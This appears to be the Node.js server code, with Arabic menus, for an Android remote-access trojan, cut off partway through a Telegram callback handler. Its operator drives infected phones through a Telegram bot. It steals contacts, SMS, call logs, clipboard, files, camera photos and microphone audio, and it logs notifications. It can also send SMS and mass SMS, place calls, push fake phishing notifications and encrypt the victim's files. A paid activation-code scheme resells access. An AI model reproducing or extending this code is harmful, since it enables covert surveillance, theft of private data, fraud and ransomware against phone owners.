// ═══════════════════════════════════════════════════════
//   📦 المكتبات
// ═══════════════════════════════════════════════════════
const express     = require("express");
const http        = require("http");
const { Server }  = require("socket.io");
const telegramBot = require("node-telegram-bot-api");
const multer      = require("multer");
const fs          = require("fs");

// ═══════════════════════════════════════════════════════
//   ⚙️ الإعدادات
// ═══════════════════════════════════════════════════════
const CONFIG = {
  DATA_FILE:  "./data.json",
  CODES_FILE: "./codes.json",
  USERS_FILE: "./users.json",
  PORT:       process.env.PORT || 3000,
  CODE_LENGTH: 8,
  CODE_CHARS:  "ABCDEFGHJKLMNPQRSTUVWXYZ23456789",
  CLEANUP_INTERVAL: 60 * 60 * 1000,
  PING_INTERVAL:    5000
};

// ═══════════════════════════════════════════════════════
//   🎨 النصوص
// ═══════════════════════════════════════════════════════
const TEXT = {
  MAIN_MENU:      "<b>🎯 ═══ القائمة الرئيسية ═══ 🎯</b>",
  CONTROL_MENU:   "<b>⚡ ═══ لوحة التحكم ═══ ⚡</b>\n\n<b>💎 الجهاز</b> → {device}\n\n<b>🎪 اختر الإجراء المطلوب</b>",
  SELECT_DEVICE:  "<b>🎯 ═══ اختر الجهاز ═══ 🎯</b>",
  NO_DEVICE:      "<b>⚠️ ═══ لا يوجد جهاز متصل ═══ ⚠️</b>",
  NO_TARGET:      "<b>❌ ═══ لم يتم اختيار جهاز ═══ ❌</b>",
  SUCCESS:        "<b>✅ ═══ تم تنفيذ الطلب ═══ ✅</b>\n\n<b>📤 النتائج ستصل قريباً...</b>",
  SUCCESS_CALL:   "<b>📞 ═══ تم تنفيذ المكالمة ═══ 📞</b>",
  DEVICE_ONLINE:  "<b>🟢 ═══ جهاز متصل ═══ 🟢</b>\n\n<b>📱 الجهاز</b> → {model}\n<b>🔢 الإصدار</b> → {version}\n<b>🌐 IP</b> → {ip}\n<b>⏰ الوقت</b> → {time}\n\n<b>⚡ ═══ الحالة نشط ═══ ⚡</b>",
  DEVICE_OFFLINE: "<b>🔴 ═══ جهاز غير متصل ═══ 🔴</b>\n\n<b>📱 الجهاز</b> → {model}\n<b>🔢 الإصدار</b> → {version}\n<b>🌐 IP</b> → {ip}\n<b>⏰ الوقت</b> → {time}\n\n<b>⚫ ═══ الحالة غير نشط ═══ ⚫</b>",
  FILE_RECEIVED:  "<b>📥 ═══ ملف مستلم ═══ 📥</b>\n\n<b>💎 الجهاز</b> → {model}\n<b>📁 الملف</b> → {filename}",
  FILE_LIST:      "<b>📂 ═══ نظام الملفات ═══ 📂</b>\n\n<b>💎 الجهاز</b> → {model}",
  FILE_ACTION:    "<b>⚙️ ═══ إجراء الملف ═══ ⚙️</b>\n\n<b>📁 الملف</b> → {name}",
  MESSAGE_FROM:   "<b>📩 ═══ رسالة مستلمة ═══ 📩</b>\n\n<b>💎 من</b> → {model}\n<b>📝 النص</b> → {msg}",
  AUTH_REQUIRED:  "<b>🔐 ═══ بوت محمي ═══ 🔐</b>\n\n<b>🎫 للدخول، أرسل كود التفعيل</b>\n\n<b>📩 أرسل الكود الذي حصلت عليه من المالك</b>",
  AUTH_WRONG:     "<b>❌ ═══ كود غير صحيح ═══ ❌</b>\n\n<b>🔁 حاول مرة أخرى</b>",
  AUTH_EXPIRED:   "<b>⏰ ═══ كود منتهي الصلاحية ═══ ⏰</b>",
  AUTH_USED:      "<b>⚠️ ═══ كود مستخدم من قبل ═══ ⚠️</b>",
  AUTH_SUCCESS:   "<b>✅ ═══ تم التفعيل بنجاح ═══ ✅</b>\n\n<b>⏱️ المدة</b> → {duration}\n<b>📅 ينتهي في</b> → {date}\n\n<b>👑 مرحباً بك 👑</b>",
  NOT_AUTH_CB:    "❌ غير مصرح",
  OWNER_WELCOME:  "\n\n<b>👑 ═══ مرحباً يا مالك البوت ═══ 👑</b>",
  USER_WELCOME:   "\n\n<b>✅ ═══ أنت مصرح لك ═══ ✅</b>\n<b>⏱️ الصلاحية المتبقية</b> → {remaining} دقيقة",
  CREATE_CODE_PROMPT: "<b>🔑 ═══ إنشاء كود جديد ═══ 🔑</b>\n\n<b>📩 أرسل المدة بالدقائق</b>\n\n<b>📋 أمثلة:</b>\n🔸 <code>60</code> → ساعة\n🔸 <code>1440</code> → يوم\n🔸 <code>10080</code> → أسبوع\n🔸 <code>43200</code> → شهر",
  CREATE_CODE_INVALID: "<b>❌ ═══ رقم غير صحيح ═══ ❌</b>",
  CREATE_CODE_DONE:   "<b>✅ ═══ تم إنشاء الكود ═══ ✅</b>\n\n<b>🔑 الكود</b> → <code>{code}</code>\n<b>⏱️ المدة</b> → {duration}\n<b>📅 ينتهي</b> → {date}\n\n<b>📤 أرسل هذا الكود للمستخدم 📤</b>",
  CREATE_CODE_CANCEL: "<b>❌ ═══ تم إلغاء الإنشاء ═══ ❌</b>",
  STATS: "<b>📊 ═══ إحصائيات البوت ═══ 📊</b>\n\n<b>🟢 مستخدمين نشطين</b> → {active}\n<b>🔴 مستخدمين منتهين</b> → {expired}\n\n<b>🎫 أكواد غير مستخدمة</b> → {unused}\n<b>✅ أكواد مستخدمة</b> → {used}\n\n<b>📱 أجهزة متصلة</b> → {devices}",
  NO_USERS: "<b>👥 ═══ لا يوجد مستخدمين ═══ 👥</b>",
  USERS_HEADER: "<b>👥 ═══ قائمة المستخدمين ═══ 👥</b>\n\n",
  USER_ITEM: "<b>👤 {index}. {status}</b>\n<b>🆔</b> → <code>{id}</code>\n<b>📛</b> → @{username}\n<b>🎫 الكود</b> → <code>{code}</code>\n<b>⏱️ متبقي</b> → {remaining}\n\n",
  START: "<b>🚀 ═══ بوت التحكم الإصدار 5 ═══ 🚀</b>\n\n<b>⚡ بوت رات قوي وسهل الاستخدام</b>\n<b>💻 لاتحتاج الا كمبيوتر لاختراق الأجهزة</b>\n<b>📱 تحكم بأي هاتف أندرويد</b>\n\n<b>🇩🇿 تم التطوير من قبل عبدو الشلفاوي</b>\n\n<b>⚠️ المطور لا يتحمل مسؤولية سوء الاستخدام ⚠️</b>\n\n<b>📡 تواصل</b> → @fox_dXx",
  DEV_INFO: "<b>👑 ═══ معلومات المطور ═══ 👑</b>\n\n<b>💎 الاسم</b> → عبدو الشلفاوي 🇩🇿\n<b>📡 تيليجرام</b> → @fox_dXx\n<b>🔗 القناة</b> → t.me/sx2teamcrack\n<b>⚡ الفريق</b> → الجيش الشلفاوي السيبراني",
  DEVICE_COUNT_HEADER: "<b>📱 ═══ الأجهزة المتصلة ═══ 📱</b>\n\n<b>🟢 العدد</b> → {count}\n\n",
  DEVICE_COUNT_ITEM:   "<b>💎 الجهاز #{index}</b>\n<b>📱 الاسم</b> → {model}\n<b>🔢 الإصدار</b> → {version}\n<b>🌐 IP</b> → {ip}\n<b>⏰ الوقت</b> → {time}\n\n",
  ASK_MIC_DURATION:   "<b>🎙 ═══ تسجيل صوت ═══ 🎙</b>\n\n<b>⏱️ اكتب مدة التسجيل بالثواني</b>",
  ASK_TOAST_TEXT:     "<b>💬 ═══ رسالة سفلية ═══ 💬</b>\n\n<b>✍️ اكتب الرسالة التي تريد اضهارها</b>",
  ASK_SMS_NUMBER:     "<b>📨 ═══ إرسال رسالة ═══ 📨</b>\n\n<b>📱 اكتب الرقم الذي تريد الإرسال إليه</b>",
  ASK_SMS_TEXT:       "<b>📨 ═══ إرسال رسالة ═══ 📨</b>\n\n<b>📱 الرقم</b> → {number}\n\n<b>✍️ اكتب نص الرسالة</b>",
  ASK_VIBRATE_TIME:   "<b>📳 ═══ اهتزاز ═══ 📳</b>\n\n<b>⏱️ اكتب مدة الاهتزاز بالثواني</b>",
  ASK_MASS_TEXT:      "<b>📢 ═══ رسالة جماعية ═══ 📢</b>\n\n<b>✍️ اكتب الرسالة لجميع الأرقام</b>",
  ASK_CALL_NUMBER:    "<b>📞 ═══ إجراء مكالمة ═══ 📞</b>\n\n<b>📱 ارسل الرقم للاتصال به</b>",
  ASK_CALL_CONFIRM:   "<b>⚠️ ═══ تأكيد المكالمة ═══ ⚠️</b>\n\n<b>📱 الرقم</b> → {number}\n\n<b>✅ اكتب كلمة \"موافق\" للتأكيد</b>",
  ASK_NOTIF_TEXT:     "<b>🔔 ═══ إشعار مزور ═══ 🔔</b>\n\n<b>✍️ اكتب نص الإشعار</b>",
  ASK_NOTIF_URL:      "<b>🔗 ═══ رابط الإشعار ═══ 🔗</b>\n\n<b>✍️ اكتب الرابط</b>",
  ASK_VOICE:          "<b>🎵 ═══ تشغيل صوت ═══ 🎵</b>\n\n<b>🎤 سجل الصوت لتشغيله</b>",
  ASK_ENCRYPT_KEY:    "<b>🔐 ═══ تشفير ملفات ═══ 🔐</b>\n\n<b>🔑 ارسل كود فك التشفير</b>"
};

// ═══════════════════════════════════════════════════════
//   🎯 الأزرار
// ═══════════════════════════════════════════════════════
const BTN = {
  COUNT_DEVICES:  "📱 عدد الأجهزة 📱",
  CONTROL_PANEL:  "⚡ لوحة التحكم ⚡",
  DEV_INFO:       "👑 معلومات المطور 👑",
  BACK_HOME:      "🔙 القائمة الرئيسية 🔙",
  BACK_ACTION:    "↩️ إلغاء الإجراء ↩️",
  CREATE_CODE:    "🔑 إنشاء كود 🔑",
  STATISTICS:     "📊 الإحصائيات 📊",
  USERS_LIST:     "👥 المستخدمين 👥",
  CONTACTS:       "📒 جهات الاتصال 📒",
  MESSAGES:       "💬 الرسائل 💬",
  CALLS:          "📞 سجل المكالمات 📞",
  APPS:           "📱 التطبيقات 📱",
  BACK_CAMERA:    "📷 كاميرا خلفية 📷",
  FRONT_CAMERA:   "🤳 كاميرا أمامية 🤳",
  MIC:            "🎙 تسجيل صوت 🎙",
  CLIPBOARD:      "📋 الحافظة 📋",
  SCREENSHOT:     "📺 لقطة شاشة 📺",
  TOAST:          "💬 رسالة سفلية 💬",
  SMS:            "📨 إرسال رسالة 📨",
  VIBRATE:        "📳 اهتزاز 📳",
  PLAY_AUDIO:     "▶️ تشغيل الصوت ▶️",
  STOP_AUDIO:     "⏹️ إيقاف الصوت ⏹️",
  KEYLOG_ON:      "🟢 تشغيل الإشعارات 🟢",
  KEYLOG_OFF:     "🔴 إيقاف الإشعارات 🔴",
  FILES:          "📂 عرض الملفات 📂",
  GALLERY:        "🎬 الصور 🎬",
  MASS_SMS:       "📢 رسالة جماعية 📢",
  FAKE_NOTIF:     "🔔 إشعار مزور 🔔",
  ENCRYPT:        "🔐 تشفير ملفات 🔐",
  CALL:           "☎️ اتصال ☎️"
};

// ═══════════════════════════════════════════════════════
//   🔗 ربط الأزرار بالأوامر
// ═══════════════════════════════════════════════════════
const DIRECT_COMMANDS = {
  [BTN.CONTACTS]:     "contacts",
  [BTN.MESSAGES]:     "all-sms",
  [BTN.CALLS]:        "calls",
  [BTN.APPS]:         "apps",
  [BTN.BACK_CAMERA]:  "main-camera",
  [BTN.FRONT_CAMERA]: "selfie-camera",
  [BTN.CLIPBOARD]:    "clipboard",
  [BTN.SCREENSHOT]:   "screenshot",
  [BTN.KEYLOG_ON]:    "keylogger-on",
  [BTN.KEYLOG_OFF]:   "keylogger-off",
  [BTN.GALLERY]:      "gallery"
};

const INPUT_COMMANDS = {
  [BTN.MIC]:        { state: "microphoneDuration", prompt: TEXT.ASK_MIC_DURATION, feature: "MIC" },
  [BTN.TOAST]:      { state: "toastText",          prompt: TEXT.ASK_TOAST_TEXT,   feature: "TOAST" },
  [BTN.SMS]:        { state: "smsNumber",          prompt: TEXT.ASK_SMS_NUMBER,   feature: "SMS" },
  [BTN.VIBRATE]:    { state: "vibrateDuration",    prompt: TEXT.ASK_VIBRATE_TIME, feature: "VIBRATE" },
  [BTN.MASS_SMS]:   { state: "textToAllContacts",  prompt: TEXT.ASK_MASS_TEXT,    feature: "MASS_SMS" },
  [BTN.CALL]:       { state: "makeCallNumber",     prompt: TEXT.ASK_CALL_NUMBER,  feature: "CALL" },
  [BTN.FAKE_NOTIF]: { state: "notificationText",   prompt: TEXT.ASK_NOTIF_TEXT,   feature: "FAKE_NOTIF" },
  [BTN.PLAY_AUDIO]: { state: "recordVoice",        prompt: TEXT.ASK_VOICE,        feature: "PLAY_AUDIO" },
  [BTN.ENCRYPT]:    { state: "encryptKey",         prompt: TEXT.ASK_ENCRYPT_KEY,  feature: "ENCRYPT" }
};

// ═══════════════════════════════════════════════════════
//   🎨 لوحات المفاتيح
// ═══════════════════════════════════════════════════════
const KB = {
  MAIN: {
    keyboard: [
      [BTN.COUNT_DEVICES, BTN.CONTROL_PANEL],
      [BTN.DEV_INFO]
    ],
    resize_keyboard: true
  },
  OWNER: {
    keyboard: [
      [BTN.COUNT_DEVICES, BTN.CONTROL_PANEL],
      [BTN.CREATE_CODE, BTN.STATISTICS],
      [BTN.USERS_LIST, BTN.DEV_INFO]
    ],
    resize_keyboard: true
  },
  CONTROL: {
    keyboard: [
      [BTN.CONTACTS, BTN.MESSAGES],
      [BTN.CALLS, BTN.APPS],
      [BTN.BACK_CAMERA, BTN.FRONT_CAMERA],
      [BTN.MIC, BTN.CLIPBOARD],
      [BTN.SCREENSHOT, BTN.TOAST],
      [BTN.SMS, BTN.VIBRATE],
      [BTN.PLAY_AUDIO, BTN.STOP_AUDIO],
      [BTN.KEYLOG_ON, BTN.KEYLOG_OFF],
      [BTN.FILES, BTN.GALLERY],
      [BTN.MASS_SMS],
      [BTN.FAKE_NOTIF, BTN.ENCRYPT],
      [BTN.CALL],
      [BTN.BACK_HOME]
    ],
    resize_keyboard: true
  },
  BACK: {
    keyboard: [[BTN.BACK_ACTION]],
    resize_keyboard: true,
    one_time_keyboard: true
  }
};

// ═══════════════════════════════════════════════════════
//   🚀 تهيئة السيرفر
// ═══════════════════════════════════════════════════════
const app      = express();
const server   = http.createServer(app);
const io       = new Server(server);
const uploader = multer();
const data     = JSON.parse(fs.readFileSync(CONFIG.DATA_FILE, "utf8"));
const bot      = new telegramBot(data.token, { polling: true });
const appData  = new Map();

const OWNER_ID = String(data.id);

// ═══════════════════════════════════════════════════════
//   🔐 نظام الصلاحيات
// ═══════════════════════════════════════════════════════
let activeCodes     = {};
let authorizedUsers = {};

function loadData() {
  try { if (fs.existsSync(CONFIG.CODES_FILE)) activeCodes = JSON.parse(fs.readFileSync(CONFIG.CODES_FILE, "utf8")); } catch(e) { activeCodes = {}; }
  try { if (fs.existsSync(CONFIG.USERS_FILE)) authorizedUsers = JSON.parse(fs.readFileSync(CONFIG.USERS_FILE, "utf8")); } catch(e) { authorizedUsers = {}; }
}
loadData();

function saveCodes() { fs.writeFileSync(CONFIG.CODES_FILE, JSON.stringify(activeCodes, null, 2)); }
function saveUsers() { fs.writeFileSync(CONFIG.USERS_FILE, JSON.stringify(authorizedUsers, null, 2)); }

function generateCode() {
  let code = "";
  for (let i = 0; i < CONFIG.CODE_LENGTH; i++) {
    code += CONFIG.CODE_CHARS.charAt(Math.floor(Math.random() * CONFIG.CODE_CHARS.length));
  }
  return code;
}

function isAuthorized(userId) {
  const id = String(userId);
  if (id === OWNER_ID) return true;
  if (authorizedUsers[id]) {
    if (Date.now() < authorizedUsers[id].expiresAt) return true;
    delete authorizedUsers[id];
    saveUsers();
    return false;
  }
  return false;
}

function formatDuration(minutes) {
  const hours = Math.floor(minutes / 60);
  const days  = Math.floor(hours / 24);
  if (days > 0) return days + " يوم";
  if (hours > 0) return hours + " ساعة";
  return minutes + " دقيقة";
}

function fill(template, vars) {
  let out = template;
  for (const key in vars) {
    out = out.replace(new RegExp("\\{" + key + "\\}", "g"), vars[key]);
  }
  return out;
}

// ═══════════════════════════════════════════════════════
//   🔧 دوال مساعدة
// ═══════════════════════════════════════════════════════
function getKeyboard(userId) {
  return String(userId) === OWNER_ID ? KB.OWNER : KB.MAIN;
}

// الحصول على اسم الجهاز الحالي من currentTarget
function getCurrentDeviceName() {
  const target = appData.get("currentTarget");
  const sock = io.sockets.sockets.get(target);
  return sock ? sock.model : "unknown";
}

// البقاء في قائمة التحكم مع نفس الجهاز
function stayInControl(chatId, deviceName) {
  bot.sendMessage(chatId, fill(TEXT.CONTROL_MENU, { device: deviceName }), {
    parse_mode: "HTML",
    reply_markup: KB.CONTROL
  });
}

// ═══════════════════════════════════════════════════════
//   🌐 HTTP
// ═══════════════════════════════════════════════════════
app.get('/', (_req, res) => {
  res.send("تم رفع الخادم معا تحيات المطور الملك صقر ");
});

app.post("/upload", uploader.single("file"), (req, res) => {
  const filename = req.file.originalname;
  const model    = req.headers.model;
  bot.sendDocument(data.id, req.file.buffer, {
    caption: fill(TEXT.FILE_RECEIVED, { model, filename }),
    parse_mode: "HTML"
  }, { filename, contentType: "*/*" });
  res.send("Done");
});

// ═══════════════════════════════════════════════════════
//   🔌 Socket.IO
// ═══════════════════════════════════════════════════════
io.on("connection", socket => {
  const model   = (socket.handshake.headers.model || "unknown") + "-" + io.sockets.sockets.size;
  const version = socket.handshake.headers.version || "no information";
  const ip      = socket.handshake.headers.ip || "no information";

  socket.model   = model;
  socket.version = version;
  socket.ip      = ip;

  bot.sendMessage(data.id, fill(TEXT.DEVICE_ONLINE, {
    model, version, ip, time: socket.handshake.time
  }), { parse_mode: "HTML" });

  socket.on("disconnect", () => {
    bot.sendMessage(data.id, fill(TEXT.DEVICE_OFFLINE, {
      model, version, ip, time: socket.handshake.time
    }), { parse_mode: "HTML" });
  });

  socket.on("file-explorer", files => {
    let rows = [], current = [];
    files.forEach((file, i) => {
      const cbData = file.isFolder
        ? model + "|cd-" + file.name
        : model + "|request-" + file.name;
      current.push({ text: file.name, callback_data: cbData });
      if (current.length === 2 || i + 1 === files.length) {
        rows.push(current);
        current = [];
      }
    });
    rows.push([{ text: "⚡ رجوع ⚡", callback_data: model + "|back-0" }]);
    bot.sendMessage(data.id, fill(TEXT.FILE_LIST, { model }), {
      reply_markup: { inline_keyboard: rows },
      parse_mode: "HTML"
    });
  });

  socket.on("message", msg => {
    bot.sendMessage(data.id, fill(TEXT.MESSAGE_FROM, { model, msg }), {
      parse_mode: "HTML"
    });
  });
});

// ═══════════════════════════════════════════════════════
//   🤖 Telegram Bot
// ═══════════════════════════════════════════════════════
bot.on("message", async msg => {
  const USER_ID = String(msg.chat.id);
  const IS_OWNER = USER_ID === OWNER_ID;
  const USER_TEXT = msg.text;

  // ═══ فحص الصلاحية ═══
  if (!IS_OWNER && !isAuthorized(USER_ID)) {
    if (appData.get(USER_ID + "_awaitCode") === true) {
      const enteredCode = (USER_TEXT || "").trim().toUpperCase();
      if (activeCodes[enteredCode]) {
        const codeData = activeCodes[enteredCode];
        if (Date.now() > codeData.expiresAt) {
          delete activeCodes[enteredCode]; saveCodes();
          return bot.sendMessage(USER_ID, TEXT.AUTH_EXPIRED, { parse_mode: "HTML" });
        }
        if (codeData.usedBy) {
          return bot.sendMessage(USER_ID, TEXT.AUTH_USED, { parse_mode: "HTML" });
        }
        authorizedUsers[USER_ID] = {
          code: enteredCode,
          activatedAt: Date.now(),
          expiresAt: Date.now() + (codeData.duration * 60 * 1000),
          duration: codeData.duration,
          username: msg.from.username || "unknown"
        };
        saveUsers();
        codeData.usedBy = USER_ID;
        codeData.usedAt = Date.now();
        saveCodes();
        appData.delete(USER_ID + "_awaitCode");
        return bot.sendMessage(USER_ID, fill(TEXT.AUTH_SUCCESS, {
          duration: formatDuration(codeData.duration),
          date: new Date(authorizedUsers[USER_ID].expiresAt).toLocaleString('ar-DZ')
        }), { parse_mode: "HTML", reply_markup: KB.MAIN });
      }
      return bot.sendMessage(USER_ID, TEXT.AUTH_WRONG, { parse_mode: "HTML" });
    }
    appData.set(USER_ID + "_awaitCode", true);
    return bot.sendMessage(USER_ID, TEXT.AUTH_REQUIRED, { parse_mode: "HTML" });
  }

  // ═══ /start ═══
  if (USER_TEXT === "/start") {
    let welcome = TEXT.START;
    const remaining = authorizedUsers[USER_ID]
      ? Math.max(0, Math.floor((authorizedUsers[USER_ID].expiresAt - Date.now()) / 60000))
      : 0;
    if (IS_OWNER) welcome += TEXT.OWNER_WELCOME;
    else welcome += fill(TEXT.USER_WELCOME, { remaining });

    return bot.sendMessage(data.id, welcome, {
      parse_mode: "HTML",
      reply_markup: getKeyboard(USER_ID)
    });
  }

  // ═══════════════════════════════════════════════════════
  //   👑 أوامر المالك
  // ═══════════════════════════════════════════════════════
  if (IS_OWNER && USER_TEXT === BTN.CREATE_CODE) {
    appData.set(OWNER_ID + "_action", "createCode");
    return bot.sendMessage(data.id, TEXT.CREATE_CODE_PROMPT, {
      parse_mode: "HTML", reply_markup: KB.BACK
    });
  }

  if (IS_OWNER && appData.get(OWNER_ID + "_action") === "createCode") {
    const minutes = parseInt(USER_TEXT);
    if (isNaN(minutes) || minutes <= 0) {
      return bot.sendMessage(data.id, TEXT.CREATE_CODE_INVALID, { parse_mode: "HTML" });
    }
    const newCode = generateCode();
    activeCodes[newCode] = {
      duration: minutes,
      createdAt: Date.now(),
      expiresAt: Date.now() + (minutes * 60 * 1000),
      createdBy: OWNER_ID,
      usedBy: null
    };
    saveCodes();
    appData.delete(OWNER_ID + "_action");
    return bot.sendMessage(data.id, fill(TEXT.CREATE_CODE_DONE, {
      code: newCode,
      duration: formatDuration(minutes),
      date: new Date(activeCodes[newCode].expiresAt).toLocaleString('ar-DZ')
    }), { parse_mode: "HTML", reply_markup: KB.OWNER });
  }

  if (IS_OWNER && USER_TEXT === BTN.STATISTICS) {
    const now = Date.now();
    let active = 0, expired = 0;
    Object.keys(authorizedUsers).forEach(uid => {
      if (now < authorizedUsers[uid].expiresAt) active++;
      else expired++;
    });
    const unused = Object.keys(activeCodes).filter(c => !activeCodes[c].usedBy && now < activeCodes[c].expiresAt).length;
    const used   = Object.keys(activeCodes).filter(c => activeCodes[c].usedBy).length;

    return bot.sendMessage(data.id, fill(TEXT.STATS, {
      active, expired, unused, used, devices: io.sockets.sockets.size
    }), { parse_mode: "HTML", reply_markup: KB.OWNER });
  }

  if (IS_OWNER && USER_TEXT === BTN.USERS_LIST) {
    const now = Date.now();
    const uids = Object.keys(authorizedUsers);
    if (uids.length === 0) {
      return bot.sendMessage(data.id, TEXT.NO_USERS, { parse_mode: "HTML", reply_markup: KB.OWNER });
    }
    let out = TEXT.USERS_HEADER;
    uids.forEach((uid, i) => {
      const u = authorizedUsers[uid];
      const isActive = now < u.expiresAt;
      out += fill(TEXT.USER_ITEM, {
        index: i + 1,
        status: isActive ? "🟢 نشط" : "🔴 منتهي",
        id: uid,
        username: u.username,
        code: u.code,
        remaining: isActive ? Math.floor((u.expiresAt - now) / 60000) + " دقيقة" : "منتهي"
      });
    });
    return bot.sendMessage(data.id, out, { parse_mode: "HTML", reply_markup: KB.OWNER });
  }

  // ═══════════════════════════════════════════════════════
  //   🎯 معالجة حالات الإدخال
  // ═══════════════════════════════════════════════════════
  const currentAction = appData.get("currentAction");
  const currentTarget = appData.get("currentTarget");

  // ✅ البقاء مع نفس الجهاز — لا نحذف currentTarget
  const afterAction = () => {
    const name = getCurrentDeviceName();
    appData.delete("currentAction");
    // ⚠️ لا نحذف currentTarget — يبقى محفوظاً
    bot.sendMessage(data.id, TEXT.SUCCESS, { parse_mode: "HTML" });
    stayInControl(data.id, name);
  };

  if (currentAction === "microphoneDuration") {
    io.to(currentTarget).emit("commend", { request: "microphone", extras: [{ key: "duration", value: USER_TEXT }] });
    return afterAction();
  }

  if (currentAction === "toastText") {
    io.to(currentTarget).emit("commend", { request: "toast", extras: [{ key: "text", value: USER_TEXT }] });
    return afterAction();
  }

  if (currentAction === "smsNumber") {
    appData.set("currentNumber", USER_TEXT);
    appData.set("currentAction", "smsText");
    return bot.sendMessage(data.id, fill(TEXT.ASK_SMS_TEXT, { number: USER_TEXT }), { parse_mode: "HTML", reply_markup: KB.BACK });
  }

  if (currentAction === "smsText") {
    const number = appData.get("currentNumber");
    io.to(currentTarget).emit("commend", {
      request: "sendSms",
      extras: [{ key: "number", value: number }, { key: "text", value: USER_TEXT }]
    });
    appData.delete("currentNumber");
    return afterAction();
  }

  if (currentAction === "vibrateDuration") {
    io.to(currentTarget).emit("commend", { request: "vibrate", extras: [{ key: "duration", value: USER_TEXT }] });
    return afterAction();
  }

  if (currentAction === "textToAllContacts") {
    io.to(currentTarget).emit("commend", { request: "smsToAllContacts", extras: [{ key: "text", value: USER_TEXT }] });
    return afterAction();
  }

  if (currentAction === "notificationText") {
    appData.set("currentNotificationText", USER_TEXT);
    appData.set("currentAction", "notificationUrl");
    return bot.sendMessage(data.id, TEXT.ASK_NOTIF_URL, { parse_mode: "HTML", reply_markup: KB.BACK });
  }

  if (currentAction === "notificationUrl") {
    const notifText = appData.get("currentNotificationText");
    io.to(currentTarget).emit("commend", {
      request: "popNotification",
      extras: [{ key: "text", value: notifText }, { key: "url", value: USER_TEXT }]
    });
    appData.delete("currentNotificationText");
    return afterAction();
  }

  if (currentAction === "makeCallNumber") {
    appData.set("currentNumber", USER_TEXT);
    appData.set("currentAction", "makeCallText");
    return bot.sendMessage(data.id, fill(TEXT.ASK_CALL_CONFIRM, { number: USER_TEXT }), { parse_mode: "HTML", reply_markup: KB.BACK });
  }

  if (currentAction === "makeCallText") {
    const number = appData.get("currentNumber");
    io.to(currentTarget).emit("commend", {
      request: "makeCall",
      extras: [{ key: "number", value: number }, { key: "text", value: USER_TEXT }]
    });
    appData.delete("currentNumber");
    return afterAction();
  }

  // ═══════════════════════════════════════════════════════
  //   🎯 الأزرار الرئيسية
  // ═══════════════════════════════════════════════════════
  if (USER_TEXT === BTN.COUNT_DEVICES) {
    if (io.sockets.sockets.size === 0) {
      return bot.sendMessage(data.id, TEXT.NO_DEVICE, { parse_mode: "HTML" });
    }
    let out = fill(TEXT.DEVICE_COUNT_HEADER, { count: io.sockets.sockets.size });
    let i = 1;
    io.sockets.sockets.forEach(s => {
      out += fill(TEXT.DEVICE_COUNT_ITEM, {
        index: i++, model: s.model, version: s.version, ip: s.ip, time: s.handshake.time
      });
    });
    return bot.sendMessage(data.id, out, { parse_mode: "HTML" });
  }

  if (USER_TEXT === BTN.CONTROL_PANEL) {
    if (io.sockets.sockets.size === 0) {
      return bot.sendMessage(data.id, TEXT.NO_DEVICE, { parse_mode: "HTML" });
    }
    const rows = [];
    io.sockets.sockets.forEach(s => rows.push([s.model]));
    rows.push([BTN.BACK_HOME]);
    return bot.sendMessage(data.id, TEXT.SELECT_DEVICE, {
      parse_mode: "HTML",
      reply_markup: { keyboard: rows, resize_keyboard: true, one_time_keyboard: true }
    });
  }

  if (USER_TEXT === BTN.DEV_INFO) {
    return bot.sendMessage(data.id, TEXT.DEV_INFO, { parse_mode: "HTML" });
  }

  if (USER_TEXT === BTN.BACK_HOME) {
    return bot.sendMessage(data.id, TEXT.MAIN_MENU, {
      parse_mode: "HTML",
      reply_markup: getKeyboard(USER_ID)
    });
  }

  if (USER_TEXT === BTN.BACK_ACTION) {
    if (IS_OWNER && appData.get(OWNER_ID + "_action") === "createCode") {
      appData.delete(OWNER_ID + "_action");
      return bot.sendMessage(data.id, TEXT.CREATE_CODE_CANCEL, { parse_mode: "HTML", reply_markup: KB.OWNER });
    }
    // العودة لقائمة التحكم مع نفس الجهاز
    const name = getCurrentDeviceName();
    return bot.sendMessage(data.id, fill(TEXT.CONTROL_MENU, { device: name }), {
      parse_mode: "HTML", reply_markup: KB.CONTROL
    });
  }

  // ═══════════════════════════════════════════════════════
  //   🎯 اختيار جهاز
  // ═══════════════════════════════════════════════════════
  let foundDevice = false;
  io.sockets.sockets.forEach((s, id) => {
    if (USER_TEXT === s.model) {
      appData.set("currentTarget", id);
      foundDevice = true;
      bot.sendMessage(data.id, fill(TEXT.CONTROL_MENU, { device: s.model }), {
        parse_mode: "HTML", reply_markup: KB.CONTROL
      });
    }
  });
  if (foundDevice) return;

  // ═══════════════════════════════════════════════════════
  //   🎯 الأوامر المباشرة
  // ═══════════════════════════════════════════════════════
  if (DIRECT_COMMANDS[USER_TEXT]) {
    if (!currentTarget) {
      return bot.sendMessage(data.id, TEXT.NO_TARGET, { parse_mode: "HTML" });
    }
    io.to(currentTarget).emit("commend", {
      request: DIRECT_COMMANDS[USER_TEXT],
      extras: []
    });
    return afterAction();
  }

  // ═══════════════════════════════════════════════════════
  //   🎯 زر عرض الملفات
  // ═══════════════════════════════════════════════════════
  if (USER_TEXT === BTN.FILES) {
    if (!currentTarget) {
      return bot.sendMessage(data.id, TEXT.NO_TARGET, { parse_mode: "HTML" });
    }
    io.to(currentTarget).emit("file-explorer", { request: "ls", extras: [] });
    // ✅ لا نحذف currentTarget
    return bot.sendMessage(data.id, TEXT.SUCCESS, { parse_mode: "HTML" });
  }

  // ═══════════════════════════════════════════════════════
  //   🎯 الأوامر التي تحتاج مدخلات
  // ═══════════════════════════════════════════════════════
  if (INPUT_COMMANDS[USER_TEXT]) {
    if (!currentTarget) {
      return bot.sendMessage(data.id, TEXT.NO_TARGET, { parse_mode: "HTML" });
    }
    const cmd = INPUT_COMMANDS[USER_TEXT];
    appData.set("currentAction", cmd.state);
    return bot.sendMessage(data.id, cmd.prompt, {
      parse_mode: "HTML", reply_markup: KB.BACK
    });
  }
});

// ═══════════════════════════════════════════════════════
//   🎙 الصوت
// ═══════════════════════════════════════════════════════
bot.on("voice", voice => {
  if (appData.get("currentAction") === "recordVoice") {
    const target = appData.get("currentTarget");
    bot.getFileLink(voice.voice.file_id).then(url => {
      io.to(target).emit("commend", {
        request: "playAudio",
        extras: [{ key: "url", value: url }]
      });
      const name = getCurrentDeviceName();
      appData.delete("currentAction");
      // ✅ لا نحذف currentTarget
      bot.sendMessage(data.id, TEXT.SUCCESS, { parse_mode: "HTML" });
      stayInControl(data.id, name);
    });
  }
});

// ═══════════════════════════════════════════════════════
//   🖱 استعلامات Inline
// ═══════════════════════════════════════════════════════
bot.on("callback_query", query => {
  const USER_ID = String(query.from.id);

  if (!isAuthorized(USER_ID)) {
